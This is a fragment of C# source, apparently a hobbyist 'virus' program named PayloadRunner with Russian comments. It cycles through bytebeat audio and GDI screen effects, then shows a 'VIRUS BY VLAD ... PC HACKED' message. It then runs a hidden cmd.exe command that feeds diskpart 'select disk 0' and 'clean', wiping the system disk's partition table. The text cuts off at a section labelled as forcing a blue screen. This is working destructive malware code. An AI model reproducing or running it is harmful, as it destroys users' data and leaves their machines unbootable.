    ...
    public class PayloadRunner {
        ...
        public static void AudioThread() {
            ...
            while (isRunning) {
                for (int i = 0; i < bufferSize; i++) {
                    byte b = 0;
                    // 7 радикально разных, экстремальных и уникальных bytebeat аудио-формул
        ...
        public static void Run() {
            ...
            while (isRunning) {
                ...
                // 7 ИНСЕЙЙЙНОВЫХ И МАКСИМАЛЬНО БЕШЕНЫХ GDI ЭФФЕКТОВ
                switch (currentPayload) {
                    case 1:
                        for (int i = 0; i < 50; i++) {
                            int rx = r.Next(0, w);
            ...
            // ФИНАЛ: Текст на весь экран
            IntPtr finalHdc = GetDC(IntPtr.Zero);
            using (Graphics gFinal = Graphics.FromHdc(finalHdc)) {
                gFinal.Clear(Color.Black);
                using (Font font = new Font("Consolas", 36, FontStyle.Bold))
                using (Brush brush = new SolidBrush(Color.Red)) {
                    gFinal.DrawString("ERROR ERROR 277 67 67, VIRUS BY VLAD\nLOL LOL LOL LOL PC HACKED LOLOLOLOL", font, brush, 50, h / 2 - 120);
                }
            }
            ReleaseDC(IntPtr.Zero, finalHdc);
            Thread.Sleep(4000);

            // УНИЧТОЖЕНИЕ MBR (Перезапись нулевым сектором диска через diskpart/cmd)
            try {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c echo select disk 0 > \\temp_mbr.txt & echo clean >> \\temp_mbr.txt & diskpart /s \\temp_mbr.txt";
                psi.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(psi);
                Thread.Sleep(1000);
            } catch {}

            // ГАРАНТИРОВАННЫЙ СИНИЙ ЭКРАН СМЕРТИ (BSOD)
            try {
